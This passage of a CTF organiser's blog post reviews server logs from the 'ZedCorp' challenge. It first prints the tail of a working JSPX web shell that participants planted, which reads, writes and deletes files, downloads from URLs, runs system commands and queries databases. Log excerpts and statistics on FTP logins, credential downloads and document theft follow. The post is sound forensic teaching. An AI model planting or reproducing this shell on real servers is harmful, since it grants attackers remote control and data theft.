HH:mm:ss&quot;);for(int i=0; i&amp;lt;l.length; i++){dt=new java.util.Date(l[i].lastModified());sT=fm.format(dt);sQ=l[i].canRead()?&quot;R&quot;:&quot;&quot;;sQ +=l[i].canWrite()?&quot; W&quot;:&quot;&quot;;if(l[i].isDirectory()){sb.append(l[i].getName()+&quot;/\t&quot;+sT+&quot;\t&quot;+l[i].length()+&quot;\t&quot;+sQ+&quot;\n&quot;);}else{sF+=l[i].getName()+&quot;\t&quot;+sT+&quot;\t&quot;+l[i].length()+&quot;\t&quot;+sQ+&quot;\n&quot;;}}sb.append(sF);}void EE(String s)throws Exception{File f=new File(s);if(f.isDirectory()){File x[]=f.listFiles();for(int k=0; k &amp;lt; x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exception{int n;byte[] b=new byte[512];r.reset();ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));os.write((&quot;-&gt;&quot;+&quot;|&quot;).getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write((&quot;|&quot;+&quot;&amp;lt;-&quot;).getBytes(),0,3);os.close();is.close();}void GG(String s,String d)throws Exception{String h=&quot;0123456789ABCDEF&quot;;File f=new File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0; i&amp;lt;d.length();i+=2){os.write((h.indexOf(d.charAt(i)) &amp;lt;&amp;lt; 4 | h.indexOf(d.charAt(i+1))));}os.close();}void HH(String s,String d)throws Exception{File sf=new File(s),df=new File(d);if(sf.isDirectory()){if(!df.exists()){df.mkdir();}File z[]=sf.listFiles();for(int j=0; j&amp;lt;z.length; j++){HH(s+&quot;/&quot;+z[j].getName(),d+&quot;/&quot;+z[j].getName());}}else{FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}is.close();os.close();}}void II(String s,String d)throws Exception{File sf=new File(s),df=new File(d);sf.renameTo(df);}void JJ(String s)throws Exception{File f=new File(s);f.mkdir();}void KK(String s,String t)throws Exception{File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s,String d)throws Exception{URL u=new URL(s);int n=0;FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b))!=-1){os.write(b,0,n);}os.close();is.close();h.disconnect();}void MM(InputStream is,StringBuffer sb)throws Exception{String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));while((l=br.readLine())!=null){sb.append(l+&quot;\r\n&quot;);}}void NN(String s,StringBuffer sb)throws Exception{Connection c=GC(s);ResultSet r=s.indexOf(&quot;jdbc:oracle&quot;)!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();while(r.next()){sb.append(r.getString(1)+&quot;\t&quot;);}r.close();c.close();}void OO(String s,StringBuffer sb)throws Exception{Connection c=GC(s);String[] x=s.trim().split(&quot;\r\n&quot;);ResultSet r=c.getMetaData().getTables(null,s.indexOf(&quot;jdbc:oracle&quot;)!=-1?x.length&gt;5?x[5]:x[4]:null,&quot;%&quot;,new String[]{&quot;TABLE&quot;});while(r.next()){sb.append(r.getString(&quot;TABLE_NAME&quot;)+&quot;\t&quot;);}r.close();c.close();}void PP(String s,StringBuffer sb)throws Exception{String[] x=s.trim().split(&quot;\r\n&quot;);Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(&quot;select * from &quot;+x[x.length-1]);ResultSetMetaData d=r.getMetaData();for(int i=1;i&amp;lt;=d.getColumnCount();i++){sb.append(d.getColumnName(i)+&quot; (&quot;+d.getColumnTypeName(i)+&quot;)\t&quot;);}r.close();m.close();c.close();}void QQ(String cs,String s,String q,StringBuffer sb,String p)throws Exception{Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery(q.indexOf(&quot;--f:&quot;)!=-1?q.substring(0,q.indexOf(&quot;--f:&quot;)):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(int i=1; i &amp;lt;=n; i++){sb.append(d.getColumnName(i)+&quot;\t|\t&quot;);}sb.append(&quot;\r\n&quot;);if(q.indexOf(&quot;--f:&quot;)!=-1){File file=new File(p);if(q.indexOf(&quot;-to:&quot;)==-1){file.mkdir();}bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(&quot;-to:&quot;)!=-1?p.trim():p+q.substring(q.indexOf(&quot;--f:&quot;)+4,q.length()).trim()),true),cs));}while(r.next()){for(int i=1; i&amp;lt;=n;i++){if(q.indexOf(&quot;--f:&quot;)!=-1){bw.write(r.getObject(i)+&quot;&quot;+&quot;\t&quot;);bw.flush();}else{sb.append(r.getObject(i)+&quot;&quot;+&quot;\t|\t&quot;);}}if(bw!=null){bw.newLine();}sb.append(&quot;\r\n&quot;);}r.close();if(bw!=null){bw.close();}}catch(Exception e){sb.append(&quot;Result\t|\t\r\n&quot;);try{m.executeUpdate(q);sb.append(&quot;Execute Successfully!\t|\t\r\n&quot;);}catch(Exception ee){sb.append(ee.toString()+&quot;\t|\t\r\n&quot;);}}m.close();c.close();}&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;cs=request.getParameter(&quot;z0&quot;)!=null?request.getParameter(&quot;z0&quot;)+&quot;&quot;:cs;response.setContentType(&quot;text/html&quot;);response.setCharacterEncoding(cs);StringBuffer sb=new StringBuffer(&quot;&quot;);try{String Z=EC(request.getParameter(Pwd)+&quot;&quot;);String z1=EC(request.getParameter(&quot;z1&quot;)+&quot;&quot;);String z2=EC(request.getParameter(&quot;z2&quot;)+&quot;&quot;);sb.append(&quot;-&gt;&quot;+&quot;|&quot;);String s=request.getSession().getServletContext().getRealPath(&quot;/&quot;);if(Z.equals(&quot;A&quot;)){sb.append(s+&quot;\t&quot;);if(!s.substring(0,1).equals(&quot;/&quot;)){AA(sb);}}else if(Z.equals(&quot;B&quot;)){BB(z1,sb);}else if(Z.equals(&quot;C&quot;)){String l=&quot;&quot;;BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null){sb.append(l+&quot;\r\n&quot;);}br.close();}else if(Z.equals(&quot;D&quot;)){BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);bw.close();sb.append(&quot;1&quot;);}else if(Z.equals(&quot;E&quot;)){EE(z1);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;F&quot;)){FF(z1,response);}else if(Z.equals(&quot;G&quot;)){GG(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;H&quot;)){HH(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;I&quot;)){II(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;J&quot;)){JJ(z1);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;K&quot;)){KK(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;L&quot;)){LL(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;M&quot;)){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals(&quot;N&quot;)){NN(z1,sb);}else if(Z.equals(&quot;O&quot;)){OO(z1,sb);}else if(Z.equals(&quot;P&quot;)){PP(z1,sb);}else if(Z.equals(&quot;Q&quot;)){QQ(cs,z1,z2,sb,z2.indexOf(&quot;-to:&quot;)!=-1?z2.substring(z2.indexOf(&quot;-to:&quot;)+4,z2.length()):s.replaceAll(&quot;\\\\&quot;,&quot;/&quot;)+&quot;images/&quot;);}}catch(Exception e){sb.append(&quot;ERROR&quot;+&quot;:// &quot;+e.toString());}sb.append(&quot;|&quot;+&quot;&amp;lt;-&quot;);out.print(sb.toString());&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;
+</code></pre>
+
+<p>No hint in access log</p>
+
+<pre><code>root@project-server:~# cat full-access.log | grep &quot;shatt.jspx&quot;
+
+10.0.0.1 - - [06/Apr/2019:02:36:09 +0200] &quot;PUT /shatt.jspx/ HTTP/1.1&quot; 201 -
+10.0.0.1 - - [06/Apr/2019:02:36:13 +0200] &quot;GET /shatt.jspx HTTP/1.1&quot; 500 5403
+10.0.0.1 - - [06/Apr/2019:02:38:34 +0200] &quot;PUT /shatt.jspx/ HTTP/1.1&quot; 204 -
+</code></pre>
+
+<h2 id="admin-server">Admin server</h2>
+
+<h3 id="first-access-1">First access</h3>
+
+<p>When did the first challenger reach the internal network ? Remember, access log on <code>project-server</code> indicates that first request was done at <code>9:48pm</code>. But on <code>admin-server</code> the first request was done at <code>9:16pm</code> (maybe because nginx ran on port 80)</p>
+
+<pre><code>root@admin-server:~# head full-access.log 
+10.0.0.1 - - [05/Apr/2019:21:16:23 +0200] &quot;GET / HTTP/1.1&quot; 401 188 &quot;-&quot; &quot;curl/7.64.0&quot;
+10.0.0.1 - - [05/Apr/2019:21:16:34 +0200] &quot;GET / HTTP/1.1&quot; 401 188 &quot;-&quot; &quot;curl/7.64.0&quot;
+10.0.0.1 - - [05/Apr/2019:21:16:43 +0200] &quot;GET / HTTP/1.1&quot; 401 188 &quot;-&quot; &quot;curl/7.64.0&quot;
+</code></pre>
+
+<h3 id="first-ftp-connexion">First ftp connexion</h3>
+
+<p>The first valid login on the ftp service was done at <code>10:47pm</code>.</p>
+
+<pre><code>root@admin-server:~# cat full-vstfpd.log | grep &quot;LOGIN&quot;
+Fri Apr  5 22:02:02 2019 [pid 1476] [backup] FAIL LOGIN: Client &quot;::ffff:10.0.0.1&quot;
+Fri Apr  5 22:02:19 2019 [pid 1480] [backup] FAIL LOGIN: Client &quot;::ffff:10.0.0.1&quot;
+Fri Apr  5 22:02:27 2019 [pid 1480] [backup] FAIL LOGIN: Client &quot;::ffff:10.0.0.1&quot;
+Fri Apr  5 22:02:41 2019 [pid 1480] [backup] FAIL LOGIN: Client &quot;::ffff:10.0.0.1&quot;
+Fri Apr  5 22:47:04 2019 [pid 1656] [backup] OK LOGIN: Client &quot;::ffff:10.0.0.1&quot;
+</code></pre>
+
+<h3 id="total-ftp-connexion">Total ftp connexion</h3>
+
+<p>There was <strong>42 connexions</strong> established on admin-server ftp server during the ctf.</p>
+
+<pre><code>root@admin-server:~# cat full-vstfpd.log | grep &quot;OK LOGIN&quot; | wc -l
+42
+</code></pre>
+
+<h3 id="first-creds-download">First creds download</h3>
+
+<p>And first downloading of encrypted credentials was done at <code>10:48pm</code></p>
+
+<pre><code>root@admin-server:~# cat full-vstfpd.log | grep &quot;OK&quot;
+Fri Apr  5 22:47:04 2019 [pid 1656] [backup] OK LOGIN: Client &quot;::ffff:10.0.0.1&quot;
+Fri Apr  5 22:47:23 2019 [pid 1659] [backup] OK LOGIN: Client &quot;::ffff:10.0.0.1&quot;
+Fri Apr  5 22:47:38 2019 [pid 1661] [backup] OK DOWNLOAD: Client &quot;::ffff:10.0.0.1&quot;, &quot;/TODO.txt&quot;, 80 bytes, 1.33Kbyte/sec
+Fri Apr  5 22:47:52 2019 [pid 1661] [backup] OK DOWNLOAD: Client &quot;::ffff:10.0.0.1&quot;, &quot;/kanban.png&quot;, 130540 bytes, 2123.12Kbyte/sec
+Fri Apr  5 22:47:54 2019 [pid 1661] [backup] OK DOWNLOAD: Client &quot;::ffff:10.0.0.1&quot;, &quot;/kanban2.png&quot;, 35776 bytes, 3169.80Kbyte/sec
+Fri Apr  5 22:48:15 2019 [pid 1661] [backup] OK DOWNLOAD: Client &quot;::ffff:10.0.0.1&quot;, &quot;/credentials.tar.gz&quot;, 304 bytes, 5.21Kbyte/sec
+</code></pre>
+
+<h3 id="number-of-credentials-download">Number of credentials download</h3>
+
+<p>Encrypted credentials have been only downloaded <strong>20 times</strong></p>
+
+<pre><code>root@admin-server:~# cat full-vstfpd.log | grep &quot;/credentials.tar.gz&quot; | wc -l
+20
+</code></pre>
+
+<h3 id="first-reading-of-confidential-documents">First reading of confidential documents</h3>
+
+<p>The first challenger stole confidential documents at <code>11:05pm</code>. He also validated the challenge in same time.</p>
+
+<pre><code>root@admin-server:~# cat full-access.log | grep -E &quot;*.pdf&quot; | grep &quot; 200 &quot;
+10.0.0.1 - admin [05/Apr/2019:23:05:25 +0200] &quot;GET /cv1.pdf HTTP/1.1&quot; 200 46462 &quot;http://10.0.0.3/index.php&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;
+10.0.0.1 - admin [05/Apr/2019:23:05:26 +0200] &quot;GET /cv2.pdf HTTP/1.1&quot; 200 250556 &quot;http://10.0.0.3/index.php&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;
+10.0.0.1 - admin [05/Apr/2019:23:05:40 +0200] &quot;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1&quot; 200 14506 &quot;http://10.0.0.3/index.php&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;
+</code></pre>
+
+<h3 id="challenge-validations">Challenge validations</h3>
+
+<p>The challenge was validated by 6 teams at :</p>
+
+<ul>
+<li>11:05pm</li>
+<li>11:16pm</li>
+<li>01:40am</li>
+<li>03:14am</li>
+<li>03:30am</li>
+<li>04:40am</li>
+</ul>
+
+<pre><code>root@admin-server:~# cat full-access.log | grep &quot;273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74&quot; | grep &quot; 200 &quot;
+
+10.0.0.1 - admin [05/Apr/2019:23:05:40 +0200] &quot;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1&quot; 200 14506 &quot;http://10.0.0.3/index.php&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;
+10.0.0.1 - admin [05/Apr/2019:23:16:12 +0200] &quot;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1&quot; 200 14506 &quot;-&quot; &quot;curl/7.64.0&quot;
+10.0.0.1 - admin [06/Apr/2019:01:40:06 +0200] &quot;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/trybu.pdf HTTP/1.1&quot; 200 14285 &quot;http://10.0.0.3/index.php&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;
+10.0.0.1 - admin [06/Apr/2019:03:14:40 +0200] &quot;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1&quot; 200 14506 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0&quot;
+10.0.0.1 - admin [06/Apr/2019:03:30:48 +0200] &quot;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1&quot; 200 14506 &quot;http://10.0.0.3/index.php&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0&quot;
+10.0.0.1 - admin [06/Apr/2019:04:40:41 +0200] &quot;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1&quot; 200 14506 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0&quot;
+</code></pre>
+
+<h2 id="final-timeline">Final timeline</h2>
+
+<p><img src="/img/hacklab-esgi-2019/timeline.png" alt="" /></p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>ZedCorp statistics :</p>
+
+<ul>
+<li>132 uniques ip</li>
+<li>Windows is the most used OS</li>
+<li>515 ssh connexion on dev-server</li>
+<li>34 meterpreters on project-server</li>
+<li>114 backdoors on project-server</li>
+<li>42 connexions to ftp admin-server</li>
+<li>20 downloads of encrypted credentials</li>
+<li>6 thefts of confidential documents</li>
+<li>6 validations</li>
+</ul>
+
+<p>I hope you appreciated this challenge and the ctf globally. I really liked to develop and maintained theme. All the hacklab staff hope to see you the next week (for #zedcorp_challenge2 !!!) :)</p>
+
+<p>See you soon,</p>
+
+<p>Th1b4ud</p>
+
+	
+			
+
+			
+
+			
+          </section>
+          
+          	
+          
+        
+      <div class="footer">
+	<hr class="thin" />
+	<div class="pure-menu pure-menu-horizontal pure-menu-open">
+		<ul class="footer-menu">
+		
+		</ul>
+	</div>
+
+	<p>&copy; 2019. All rights reserved.</p>
+</div>
+    </div>
+  </div>
+	
+
+	
+
+  
+</body>
+</html>
